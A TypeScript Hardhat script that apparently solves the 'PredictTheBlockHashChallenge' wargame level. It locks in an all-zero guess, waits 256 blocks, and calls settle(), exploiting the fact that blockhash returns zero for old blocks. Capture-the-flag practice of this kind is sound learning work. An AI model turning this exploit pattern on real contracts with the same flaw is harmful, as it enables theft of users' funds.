import { utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0x4c99d5477B32F44fDE4dd1Fe9e9B498a87CFAbF1";

async function main() {
  const challengeFactory = await ethers.getContractFactory("PredictTheBlockHashChallenge");
  const challengeContract = challengeFactory.attach(contractAddress);

  console.log("locking the number...");
  const lockInGuessTx = await challengeContract.lockInGuess(
    "0x0000000000000000000000000000000000000000000000000000000000000000",
    { value: utils.parseEther("1"), gasLimit: 1000000 },
  );
  await lockInGuessTx.wait();

  const initBlockNumber = await ethers.provider.getBlockNumber();

  // Wait for 256 blocks
  let lastBlockNumber = initBlockNumber;
  do {
    try {
      lastBlockNumber = await ethers.provider.getBlockNumber();
      console.log(`Block number: ${lastBlockNumber}`);
      await new Promise(resolve => setTimeout(resolve, 1000 * 12));
    } catch (err) {
      console.log(err);
    }
  } while (lastBlockNumber - initBlockNumber < 256);

  const attackTx = await challengeContract.settle();
  await attackTx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
